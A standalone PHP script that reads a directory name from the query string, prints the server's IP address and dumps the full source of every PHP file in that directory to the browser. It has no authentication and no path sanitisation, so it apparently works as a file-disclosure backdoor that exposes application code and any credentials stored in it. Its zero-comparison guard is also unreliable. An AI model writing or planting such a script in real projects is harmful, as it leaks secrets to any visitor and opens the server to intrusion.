<?php
// "*******************************GET DIRECTORY***************************************<br>";

$target_dir = isset($_GET['dir']) ? $_GET['dir'] : 0;

if($target_dir == 0){
    echo "FAILED TO OPEN DIRECTORY";exit;
}

$target_dir='/'.$target_dir.'/';

// "*******************************GET HOSTNAME***************************************<br>";


echo "*******************************HOSTNAME***************************************<br>";

echo 'hostname: '.$_SERVER['SERVER_ADDR'];

// "*******************************GET All FILES UNDER DIRECTORY***************************************<br>";

$path = dirname(__FILE__);
$array = explode('/',$path);
$array = array_slice($array, 0, -2);
$main_path = implode('/',$array);
$files = scandir($main_path.$target_dir);

// "*******************************READ FILES***************************************<br>";

foreach($files as $key=>$file)
{
    $info = pathinfo($file);
    if($info['extension'] == 'php'){
        $file_name =  $main_path.$target_dir.$file;
        echo "<br><br><b><hr>$file_name</hr></b><br><br>";
        $file = fopen($file_name, "r");
        while (!feof($file)) {
          echo fgets($file) . "<br />";
        }
        fclose($file);
    }
}
